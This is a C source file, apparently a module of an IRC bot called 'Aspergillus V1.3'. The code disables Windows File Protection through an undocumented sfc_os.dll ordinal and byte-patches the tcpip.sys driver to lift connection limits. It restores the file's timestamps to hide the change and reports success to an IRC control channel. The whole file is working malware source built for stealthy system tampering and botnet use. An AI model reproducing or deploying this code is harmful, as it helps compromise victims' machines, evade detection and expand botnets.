/*
		Aspergillus V1.3 by D
		Copyright (c) 2007
*/

#include "shared.h"

#ifndef NO_PATCHER

/////////////////
// config here //
/////////////////

char	cfg_pchan[] = "#abc123";

// not encoded strings
static char string_fixed[] = "TCPIP.SYS fixed, version:";

/////////////////
// config ends //
/////////////////


extern "C" {
	#include "version.h"
}

//make backup of our file
BOOL backup(char szPath[MAX_PATH]) {

	char szBckPath[MAX_PATH];

	sprintf(szBckPath, "%s.bck", szPath);
	if (CopyFile(szPath, szBckPath, FALSE)) return TRUE;
	else return FALSE;
}

//disable windows file protection 
void Disable_WFP(char *szFile) {

	//we have to convert ASCII string to Unicode string, else this wont work
	wchar_t path[256];
	MultiByteToWideChar(CP_ACP, 0, szFile, -1, path, 256);

	typedef DWORD(__stdcall *CPP) (DWORD param1, PWCHAR param2, DWORD param3);
	HINSTANCE hmod=LoadLibrary("sfc_os.dll");
	CPP SetSfcFileException;

	// the function is stored at the fifth ordinal in sfc_os.dll
	SetSfcFileException= (CPP)GetProcAddress(hmod,(LPCSTR)5);
	SetSfcFileException(0, path, -1);

	//Now we can modify the system file in a complete stealth.
}

DWORD WINAPI PatcherThread(LPVOID param) { 

	FILE *f;
	int i; 
	HANDLE hTimeFile;
	FILETIME aFileTime, bFileTime, cFileTime;
	char Buffer[MAX_LINE];
	char szPath[MAX_PATH], szSysDir[MAX_PATH];

	//change limit to 1000
	char *bytes2180[8] = {"\x4C", "\x16", "\x06", "\x00", "\xE8", "\x03", "\x00", "\x00"};
	char *bytes2892[8] = {"\x43", "\xFC", "\x05", "\x00", "\xE8", "\x03", "\x00", "\x00"};
	//change limit to unknown
	char *bytes2505[2] = {"\xE5", "\xC8"};
	char *bytes2685[3] = {"\x99", "\x47", "\xC8"};
	int match = 0, offset[8];

	char *szByte;

	BOOL fixed = FALSE;

	PATCHER patcher = *((PATCHER *)param);

	szByte = (char *) malloc (1);
	
	GetSystemDirectory(szSysDir, sizeof(szSysDir));
	sprintf(szPath, "%s\\drivers\\tcpip.sys", szSysDir);

	int version = tcpipVersion(szPath);

	if (version == 0) 
	{
		Thread_Clear(patcher.tnum);
		ExitThread(0);
	}

	//Make backup
	backup(szPath);

	//lets wait some time, then patch it.
	Sleep(2000);

	//disable windows checking our file
	Disable_WFP(szPath);

	//set our file attributes to normal (just in case being set to readonly)
	SetFileAttributes(szPath, FILE_ATTRIBUTE_NORMAL);

	//get time of our file
	hTimeFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);
	}

	//open file
	f = fopen(szPath, "r+b");
	if (f == NULL) {
		//_snprintf(buffer, sizeof(buffer), "Can not open TCPIP.SYS, version %d.", patcher.version);
		Thread_Clear(patcher.tnum);
		ExitThread(0);
	}

	switch (version) {
	case 1: 
		{
		offset[0] = 0x00130;
		offset[1] = 0x00131;
		offset[2] = 0x00132;
		offset[3] = 0x00133;
		offset[4] = 0x4F322;
		offset[5] = 0x4F323;
		offset[6] = 0x4F324;
		offset[7] = 0x4F325;
		//check the file
		for (i = 0; i < 8; i++) {         
			fseek(f, offset[i], SEEK_SET);
			fread(szByte, 1, 1, f);
			if (strncmp(szByte, bytes2180[i], 1) == 0) match++;
		}
		if (match < 8) { 
			//write bytes to file
			for (i = 0; i < 8; i++) {
				fseek(f, offset[i], SEEK_SET);
				fwrite(bytes2180[i], 1, 1, f);		
			}
			fixed = TRUE;
		}
		break;
		}
	case 2:
		{
		offset[0] = 0x00130;
		offset[1] = 0x00131;
		offset[2] = 0x00132;
		offset[3] = 0x00133;
		offset[4] = 0x4F5A2;
		offset[5] = 0x4F5A3;
		offset[6] = 0x4F5A4;
		offset[7] = 0x4F5A5;
		//check the file
		for (i = 0; i < 8; i++) {         
			fseek(f, offset[i], SEEK_SET);
			fread(szByte, 1, 1, f);
			if (strncmp(szByte, bytes2892[i], 1) == 0) match++;
		}
		if (match < 8) { 
			//write bytes to file
			for (i = 0; i < 8; i++) {
				fseek(f, offset[i], SEEK_SET);
				fwrite(bytes2892[i], 1, 1, f);
			}
			fixed = TRUE;
		}
		break;
		}
	}

	//close file
	fclose(f);

	//set file time back to what it used to be
	hTimeFile = CreateFile(szPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);
	}

	if (fixed) 
	{
		_snprintf(Buffer, sizeof(Buffer) - 1, "%s %d.", string_fixed, version);
		IRC_Send(patcher.Sock, MSG_PRIVMSG, Buffer, cfg_pchan);
		memset(Buffer, 0, sizeof(Buffer));
	}

	Thread_Clear(patcher.tnum);
	ExitThread(0);
}

#endif
